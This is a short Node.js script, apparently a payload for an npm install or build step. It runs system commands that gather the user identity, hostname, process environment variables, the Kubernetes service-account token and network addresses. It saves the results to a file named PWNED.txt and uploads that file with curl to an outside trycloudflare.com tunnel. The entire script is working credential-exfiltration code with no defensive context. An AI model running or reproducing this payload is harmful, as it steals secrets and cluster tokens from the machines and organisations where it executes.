const {execSync}=require('child_process');const fs=require('fs');
let out='';try{out=execSync('id; hostname; cat /etc/hostname; echo ENV; cat /proc/self/environ | head -c 3000; echo; echo SA; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null; echo; echo NET; ip addr 2>/dev/null | head -30',{encoding:'utf8',timeout:15000})}catch(e){out=String(e)}
try{fs.writeFileSync('PWNED.txt',out)}catch(e){}
try{execSync("curl -s --max-time 10 --data-binary @PWNED.txt https://idaho-builds-choir-withdrawal.trycloudflare.com/cb/npm-nodejs",{timeout:20000})}catch(e){}
console.error('PWNED_MARKER '+out.replace(/\n/g,' | ').slice(0,1500));
